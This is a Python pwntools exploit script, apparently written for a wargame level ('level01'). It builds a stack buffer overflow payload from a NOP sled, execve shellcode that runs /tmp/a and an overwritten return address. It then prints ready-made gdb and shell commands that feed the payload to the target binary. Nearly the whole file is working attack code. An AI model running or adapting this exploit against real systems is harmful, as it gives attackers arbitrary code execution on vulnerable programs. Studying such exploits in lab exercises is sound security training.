#!/usr/bin/python3
from binascii import hexlify
from pwn import *

"""
This script created to help inject shellcode into stack and run our own binary. 
It will assume that environment variables in gdb and sh equal. 
To guarantee this run both your binary and gdb with: 
env -i PWD=$PWD SHELL=$SHELL SHLVL=$SHLVL LINES=211 COLUMNS=53" 
"""


def bytes_to_hex_string(data):
    payload = ''.join([f'\\x{x:02x}' for x in data])
    return payload


def print_gcc_string(shellcode):
    gcc_string = r'run < <(printf "dat_will\n'
    print(gcc_string + bytes_to_hex_string(shellcode) + '")')


def print_shell_string(shellcode):
    shell_string = "python -c 'print(b\"dat_will\\n"
    env_end = "\")' | env -i PWD=$PWD SHELL=$SHELL SHLVL=$SHLVL LINES=211 COLUMNS=53 /home/users/level01/level01"
    print(shell_string + bytes_to_hex_string(shellcode) + env_end)
    pass


# On start we need to examine binary in gdb and find the address in which fgets writes buffer. Put it here
buffer_start = 0xffffddac
executable_path = b"/tmp/a"
asm_shellcode = """
mov    eax,0xb
mov    ebx,{executable_address}
xor    ecx,ecx
mov    edx,ecx
int    0x80 
"""
stack_shift = 80

# We need some shift because this area will be reused in other function
left_shift = 8
data_area = b"\x90" * left_shift + executable_path + b'\x00'

# Start of executable will be needed to point to it in shellcode
executable_address = buffer_start + left_shift
shellcode = asm(asm_shellcode.format(executable_address=executable_address))
shellcode_address = buffer_start + len(data_area)

payload = (data_area + shellcode).ljust(stack_shift, b'\x90')
payload += p32(shellcode_address)

print("=" * 80)
print("Helpers and result:")
print(f"Check executable path address with:")
print(f"x /s {hex(executable_address)}")
print("Check shellcode with: ")
print(f"x /{len(shellcode)}i {hex(shellcode_address)}")
print(f"Whole payload length is {len(payload)}")

print()
print('*' * 80)
print()
print("Try gdb with command:")
print_gcc_string(payload)
print("Try in shell with command:")
print_shell_string(payload)

if __name__ != "__main__":
    pass
